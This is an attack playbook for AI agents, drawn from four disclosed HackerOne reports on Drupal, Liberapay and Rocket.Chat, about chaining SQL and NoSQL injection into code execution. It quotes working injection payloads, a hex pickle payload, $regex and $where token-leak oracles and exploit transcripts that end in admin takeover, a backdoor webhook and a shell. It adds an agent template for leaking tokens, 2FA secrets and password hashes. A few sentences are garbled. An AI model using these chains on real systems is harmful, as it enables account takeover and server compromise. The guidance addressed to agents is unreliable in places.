---
title: "SQL Injection → Remote Code Execution — the escalation chains"
type: playbook
category: sqli-to-rce-chains
cwe: "CWE-89, CWE-502, CWE-94"
source_count: 4
full_bodies_available: 4
corpus: "HackerOne disclosed reports, 2014–2022 era, list seeded from github.com/shreyaschavhan/h1-reports-for-reference TOPSQLI.md, bodies fetched via hackerone.com/reports/<id>.json"
list_accessed: "2026-10-25"
note: "Every claim traces to bodies read in full this session; bounty figures are JSON amounts where present, otherwise as stated on the source list (marked). One case is a *conditional* chain (SQLi assumed, not performed — recorded honestly below). Severity/weakness labels are archive-era historical; bodies are the class authority."
---

# SQL Injection → Remote Code Execution — the escalation chains

## 1. Overview

Four full-body cases (2014–2021) cross the line every other playbook stops
short of: injected SQL (or its query-language cousin, injected MongoDB
operators) becomes **arbitrary code execution on the server**. The corpus shows
two escalation shapes, and both are *second-stage gadget* chains — the SQL bug
provides the write/read primitive, a different flaw turns it into execution:

- **Write → stored gadget**: inject or tamper data the framework later
  *executes* — Drupal's session serialization (SQL-31756), Liberapay's pickled
  notification contexts (SQL-361341), Rocket.Chat's webhook scripts
  (SQL-1130721/1130874).
- **Read → credential takeover**: leak a reset token / 2FA secret through the
  injection, take an admin account, then use an *admin feature* that supports
  scripting (Rocket.Chat, both NoSQL cases).

The abusive sentence an agent should internalize from this file — the era's own
boundaries — is that neither Rocket.Chat report treats *SQLi* as the end
finding; the chain's floor is ATO and its ceiling is `whoami → rocketchat`.

**Case-ID scheme: `SQL-<report id>`** (e.g. `SQL-31756`).

## 2. SQL-31756 — Drupal 7 pre-auth SQLi → session → PHP execution ($3,000 list, Internet Bug Bounty)

The era's definitive chain (CVE-2014-3704, disclosed 2015). The bug is inside a
*framework security helper* — the prepared-statement expansion of `IN`
placeholders:

> Drupal uses Prepared Statements to secure the SQL Querys from Injections. To handle IN statements they created a expandArguments function, which uses the Array keys to create names for the placeholders. (sic "Querys" kept)

> The function assumes that it is called with an array which has no keys. Example:

>     db_query("SELECT * FROM {users} where name IN (:name)", array(':name'=>array('user1','user2')));

> The Problem occurs, if the array has keys, which are no integers. Example:

>     db_query("SELECT * FROM {users} where name IN (:name)", array(':name'=>array('test) -- ' => 'user1','test' => 'user2')));

> this results in an exploitable SQL query:

>      SELECT * FROM users WHERE name IN (:name_test) -- , :name_test )

with parameters :name_test = user2.

Then the two-step escalation, each verbatim and each a chain link an agent
should be able to re-derive:

> Since Drupal uses PDO, multi-queries are allowed. So this SQL Injection can be used to insert arbitrary data in the database, dump or modify existing data or drop the whole database.

> With the possibility to INSERT arbitrary data into the database an attacker can execute any PHP code through a manipulated Session and Drupal features with callbacks.

The PoC section records the two shapes of demonstration:

> I included two PoCs. The first creates one request to create a session which has Admin privileges (UserID 1). The second executes code with only one request and destroys the session afterwards to not create a new Database entry.

plus a route in the record and scope self-description:

> You need not have any user or knowledge of the targeted site.

The report carries its CVE line —

> The Common Vulnerabilities and Exposures project (cve.mitre.org) has assigned the name CVE-2014-3704 to this vulnerability.

— and cites the SektionEins advisory (recorded in `references/blogs-index.md`).

**Agent takeaways**: (a) *framework helper code is the sink* — the
vulnerability is not in an application template but in the layer every.
(b) Multi-statement/multi-query capability is the *enabler* of the write-chain;
treat "uses PDO" as a payload-space question, not a guarantee. (c) The chain
ends in a *session table write* — persisting execution without shell access.

## 3. SQL-361341 — Liberapay: SQLi → pickled notification → command execution

The corpus's *conditional* chain — the title says exactly that:

> Unsafe deserialization in Libera Pay allows to escalate a SQL injection to Remote Command Execution

and its opening paragraph is the model of honest scoping for chained findings:

> There isn't a direct vulnerability, however a SQL injection would easily be escalated to a Remote Code Execution. I can't directly exploit it due to the restriction on team names (it does not accept hexdecimal values). I, however, submit this issue in advance and will attempt to escalate this issue  (sic "hexdecimal" kept)

The gadget — pickled contextual data rendered for a user:

> The vulnerability relies in the serializer & deserializier used for notifications of users. It is using [pickles](https://github.com/liberapay/liberapay.com/blob/8546e2212f08f0d0ad71008ccf679744c3e8fb81/liberapay/utils/__init__.py#L370), which is known to be unsafe. You can basically craft any objec  (sic "deserializier" kept)

with the render path quoted from the code:

```python
  for id, event, notif_context, is_new, ts in notifs:
            try:
                notif_context = deserialize(notif_context)
```

and the PoC — a `notifications.context` overwrite whose payload's *first
demonstration is a sleep(500000), not a shell* (the pickle gadget marked by
`posix system` and the sleep string in the hex):

> 1. Invite an user into your team.
> 2. Update the context of the notification in the table notifications, by running the SQL query:

```
UPDATE notifications SET context = E'\\x80027d710028580400000061736432710158030000006c6f6c71025801000000627103580500000033303030307104580100000063710563706f7369780a73797374656d0a7106580c000000736c656570203530303030307107857108527109752e' WHERE id = 43;`
```

> 3. Log in as the user who is invited to your team, browse to notifications and notices that the sleep command was used (basically, it will hang). (sic "notices" kept)

**Agent takeaways**: (a) the *sleep gadget inside pickle* mirrors the time-based
playbooks' proof style — the chain's first confirmed rung is also a clock,
consistent with the whole vault. (b) The report demonstrates the escalation
target without claiming it live — because the second stage (SQLi) was blocked
by input validation on team names. Never present a chain as stronger than its
weakest demonstrated link; this report's substate *resolved* shows a program
still takes conditional escalation reports seriously when the links are named.

## 4. SQL-1130721 — Rocket.Chat pre-auth NoSQLi → reset-token leak → admin webhook → shell

The 2021 flagship of the NoSQL variant. The sink is the methods API that
validates password-reset tokens:

> The `getPasswordPolicy` method does not properly validate or sanitize the `token` parameter and can thus be used to perform a blind NoSQL injection. It can be called without authentication (which seems intended), e.g. by using the `/api/v1/method.callAnon` API endpoint

The oracle — MongoDB's `$regex` on the token field:

> By using [MongoDB's `$regex` operator](https://docs.mongodb.com/manual/reference/operator/query/regex/), a password reset token can be leaked character by character. Example: in order to check if the password reset token begins with a specific letter, e.g. `A`, the attacker would send the JSON object `{"$regex":"^A"}` as the `token` parameter. The response contains the server's password policy when the guess was correct, or an error otherwise.

(That is the band pair — *policy response vs error* — same true/false contract
as `Boolean-and-Content-Oracle.md` §2, transposed into operator-injection.)

The staged chain, verbatim, culminating in the admin webhook:

> 1. Request a password reset for the target user's account. This requires the attacker to know the target user's email address.
> 1. Leak the password reset token as explained above
> 1. Reset the target user's password to an attacker known one using the password reset token. The target user cannot have email or TOTP 2FA enabled in order for this step to work.

> To gain Remote Code Execution capabilities on the server, an attacker can follow these steps to take over an admin account. The attacker can then use the newly gained admin privileges to create an incoming web hook that has a script. This allows them  to get execute commands or get a shell on the server, because the script is executed on the server without a security boundary in place (which seems to be intended).

with the exploit transcript showing each rung firing — including the *proof
markers* (`whoami` / `id` output) — quoted verbatim (lines truncated in the
archive's rendering as stored):

```
[+] Requesting password reset for "[REDACTED_EMAIL]"...
[*] Leaking password reset token...
[+] Leaked password reset token: 0q9oakr3Lc94p3AnUjtQGlBm4bqJF3AndFYOjIg94ld
[+] Resetting password to "f7c87ed1559f2fe101ee"...
[+] Admin account takeover successful!
[+] Creating hook "backdoor-8624225d" with secret "8e2b809f6d1e9c561f9625d362726672"...
[*] Hook: T4nRot8nRvgEDp6rn/6sfs8GYcZCmH7SjKeazsexGmCJjFdLwWMdsqyz9hTcPFYxKF
[+] Dropping into shell:
$ whoami
rocketchat
$ id
uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)
```

(Identity strings best understood as artifacts of the reporter's
*self-hosted Docker demo instance* — the report's own reproduce steps create
exactly that environment; they do not name a live production org.)

The reproducibility commitment is the strongest in the corpus — the steps
section starts from *nothing* and reconstructs the vulnerable software:

> 1. Set up an instance of RocketChat 3.12.1, e.g. by cloning the repo and using Docker Compose:
>   1. `git clone [REDACTED_EMAIL]:RocketChat/Rocket.Chat.git`
>   1. `cd Rocket.Chat`
>   1. `git checkout tags/3.12.1`
>   1. `docker-compose up -d`

affected-since pinning:

> - Seems to be affected since 3.8.0 as the vulnerability was introduced in [commit b950f17](…)

and a one-line remediation:

> Ensure that the user-provided `token` parameter is a string.

## 5. SQL-1130874 — Rocket.Chat post-auth `users.list` NoSQLi → token + 2FA leak → admin webhook → shell

The second report, eight weeks later, fixes the *pre-auth* variant's 2FA gap by
attacking an authenticated endpoint. The sink is the custom-query acceptor:

> The `users.list` API endpoint takes a custom query via the `query` URL query parameter. Although the returned fields are restricted, the query is not validated or sanitized properly and can thus be used to perform a blind NoSQL injection that can leak any field's value of any document in the `users` collection.

The oracle — `$where`, i.e. *attacker JavaScript inside the database*:

> By using [MongoDB's `$where` operator](https://docs.mongodb.com/manual/reference/operator/query/where/), an attacker can build arbitrary oracles that can leak the value of any field of any user document.

> Example: in order to check if the password reset token of an admin user begins with a specific letter, e.g. `A`, the attacker would send the JSON object `{"$where":"this.roles.includes('admin') && /^A/.test(this.services.password.reset.token)"}` as the `query` parameter. The response contains the matching admin user when the guess was correct, or no users otherwise. This can be repeated for all possible characters and for each position in the token, until the whole token is known. See the `users_nosqli_blind_leak` function in the attached exploit for an implementation of this.

The 5-step chain names *2FA-secret leaking* explicitly — the piece the
pre-auth case could only sidestep:

> 1. Leak the TOTP 2FA secret or email 2FA token hash if necessary

and its transcript shows exactly that rung firing, alongside the restore step
(good hygiene — the takeover is transient):

```
[+] Found admin: username=admin id=56gyPQKt8Ff3Weowk
[*] Leaking email...
[+] Leaked email: [REDACTED_EMAIL]
[*] Leaking password hash...
[+] Leaked password hash: $2b$10$ubhEIM/j6qLFNINHVbP.B.CJFCXagK7V5zD0Q8BYzs6UBlbBpiECa
[+] Requesting password reset...
[*] Leaking password reset token...
[+] Leaked password reset token: ET4sx905cF9pTZOsHFu6eRad7MwpYmqs-iTMWQIXAhv
[+] Resetting password to "DEbCf2b0A2BE79bBcDf1"...
[+] Admin account takeover successful!
[+] Creating hook "backdoor-9Fbd6E5A" with secret "AbE217B9d9e7Dd0CB2EB8dd30d26edfe"...
[*] Hook: 7bgxdkGHQYdBwtHWA/2S3EGB2ywWHM3aeYKu2q7akGF6TEjXEKMGK2Smggw7LpSLHc
[+] Restoring admin password...
[+] Dropping into shell:
$ whoami
rocketchat
$ id
uid=65533(rocketchat) gid=65533(rocketchat) groups=65533(rocketchat)
```

The suggested mitigation is a *framework-level* allowlist pattern:

> - Properly validate the `query` parameter:
>   - Restrict the usage of MongoDB operators using an allowlist, especially top level operators like `$where`
>   - Restrict the set of query-able fields using an allowlist (like the restriction on the returned fields)
> - Check every API endpoint that uses the `parseJsonQuery()` function for similar vulnerabilities

— that last line is *class-transfer doctrine*: fix the acceptor at every
endpoint that shares the same parser (`parseJsonQuery()`), not just the one
that was reported.

## 6. Comparative anatomy — what makes each chain work

| # | Stage-1 primitive (the "SQLi") | Write or Read? | Stage-2 gadget | Executed as |
|---|---|---|---|---|
| SQL-31756 | injected array-key placeholder collapse → multi-query INSERT | **write** | attacker session row → framework deserializes/execs | PHP (Drupal) |
| SQL-361341 | SQLi *assumed*, not performed (author states why) | **write** | pickled notification context deserialized at render | Python (pickle) |
| SQL-1130721 | operator injection in reset-token check (`{"$regex":"^A"}`) | **read** | admin's "incoming web hook that has a script" | Rocket.Chat server (Node) |
| SQL-1130874 | operator injection in custom query acceptor (`{"$where":…}`) | **read** | same webhook gadget (post-auth path) | Rocket.Chat server (Node) |

Two entity-level lessons: **read-chains need a trusted deserialization or
script hook on the far side; write-chains need the application to *trust*
(later deserialize / exec) what sits in the database.** An agent hunting for
SQLi should inventory the far side the same way: session serializers, pickle
records, webhook script features, template caches, SPA hydration blobs.

Also note the twinned-feature pattern of the two Rocket.Chat reports — the
pre-auth one's limitation (*The target user cannot have email or TOTP 2FA
enabled*) is exactly what the post-auth one removed by leaking the 2FA secret
itself. When a chain leaves a named gap, that gap is the next report.

## 7. Agent execution template

1. **Stage the chain sideways, not forward.** The corpus never turns "more
   SQLi capability" into "more leak"; it pivots to a *different vulnerable
   system* (session serialize, pickle, webhook script, managed 2FA fields).
   After confirming SQLi (`Time-Based-Blind.md`/`Boolean-and-Content-Oracle.md`
   gates), ask: *what does this backend trust that I can now write or read?*
2. **Inventory trusted stores**, in the corpus's demonstrated order: session
   tables and their serializers (SQL-31756); pickled/serialized event or
   notification contexts (SQL-361341); admin-only incoming-webhook script
   features (SQL-1130721/1130874); password-reset/2FA secret fields records
   (NoSQL-side operator reads in both Rocket.Chat cases).
3. **For read-chains**, ladder the field-level leaks: first the token field
   itself, then the 2FA secret, then credentials-adjacent password-hash fields
   before the final reset — the exact field order of SQL-1130874's transcript.
   Keep the field-guess loop *character-by-character* — one question per
   request — never bulk `$where: "true"`.
4. **For write-chains**, bound the write to the *one field the gadget reads*,
   then confirm with the least-impact gadget (SQL-361341's sleep(500000) in a
   pickle — a clock, again). Destructive gadgets (`posix.system("rm …")`,
   webhook scripts beyond `whoami`) are *not* corpus-backed on production
   targets; demo them on the self-built instance, as both Rocket.Chat reports
   did via their full Docker Compose reconstructs.
5. **Bound the takeover**: SQL-1130874 restored the admin password before its
   own video ended — *"The unsuccessful login at the end of the video does not
   mean that the exploit did not work, it just shows that the original admin
   password was restored"* — replicate that restore step explicitly.
6. **Demo-environment discipline**: both Rocket.Chat reports pin the exact
   software (`git checkout tags/3.12.1`), name the demo admin's email, and
   attach the exploit script. A chain claim is strongest when anyone can
   rebuild the vulnerable state and reproduce it end to end.

## 8. Validation gates

1. **Every link of the chain is state-changing-verifiable** — ATO confirmed by
   a response that only the true user sees; RCE confirmed by `whoami`/`id`
   style output, not inference from admin-panel presence alone (both Rocket.Chat
   bodies end in shell identically recorded).
2. **The SQL question is bounded by its band clocks/oracle** — the chain inherits
   the band-pair proof obligation from `Boolean-and-Content-Oracle.md` §9 and
   the series proof from `Time-Based-Blind.md` §9; a chain never *loosens* the
   stage-1 gates, it adds to them.
3. **Write-chain evidence requires the render/gadget trigger demonstrated once**
   (SQL-361341's step 3 — the notifications page *hangs* on the sleep gadget
   proves the far side deserialized — before any stronger gadget is named).
4. **Conditional chains are labeled conditional** — SQL-361341's opening is
   the corpus's *positive template* for "not directly exploitable, chain
   described, links identified". Fabricating a live demo you don't have is
   the failure mode this file's gates guard against.
5. **Boundaries observed**: in the Rocket.Chat pair, both RCEs come from the
   *hook script* the point-of-takeover admin can already legitimately create —
   that is what makes the RCE *impact* demonstrable while staying inside
   program rules; framing "I used a legitimate admin feature, then executed
   commands via it" is the honest shape of the impact paragraph.

## 9. Remediation the bodies themselves propose

- SQL-31756 points to the vendor advisory rather than a long remediation
  section — *"https://www.sektioneins.de/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html"* —
  and carries the CVE line itself (CVE-2014-3704).
- SQL-361341's remediation is *upstream*: stop handing pickle-decodable bytes
  into `render_notifications`, or replace pickle for notification contexts
  with a strict schema format — no remediation section exists in the body;
  the program resolved the report (substate resolved), and the body's linked
  GitHub source lines identify the exact function to change.
- SQL-1130721: *"Ensure that the user-provided `token` parameter is a string."*
- SQL-1130874 proposes the *parser-level* allowlist pattern quoted in §5
  above — covering every endpoint that shares the vulnerable parser — and the
  corpus shows the pair of reports doing that from both sides: attacker-side
  (pre-auth) and parser-side (allowlist-level) remediation. An agent claiming
  a "fixed" program should verify both angles to the extent the target's
  history indicates.

## 10. Archive-era label honesty

- SQL-31756 filed under weakness `SQL Injection` — the DoD-labeled *title*
  ("remote code execution") captures the chain; era severity system: none.
- SQL-361341 filed under **"Deserialization of Untrusted Data"** — the
  *gadget* labels the finding, not the stage-1 SQLi. Accurate but worth
  glossing when cross-filed from this playbook.
- SQL-1130721 / SQL-1130874 filed under `None` with severity
  `critical`/`high`, substate resolved — the era's "NoSQL injection" naming
  convention (BSON-aware operator injection) is applied precisely:
  both are Mongo *query operator injection*, not classic SQL string
  concatenation — a genuinely different query language exposed by the same
  *accept-anything* sink pattern; the vault's other playbooks' band-pair and
  oracle doctrines still apply, but the payload surface lives inside
  structured JSON, not URL strings.

**Cross-references**: stage-1 confirmations in `Time-Based-Blind.md` and
`Boolean-and-Content-Oracle.md`; in-band and OOB channels in
`Error-and-Union-Output.md` / `Out-of-Band-Callback.md`; the framework/helper
sink (SQL-31756's `expandArguments`) cross-filed to
`Library-and-Framework-SQLi.md`.
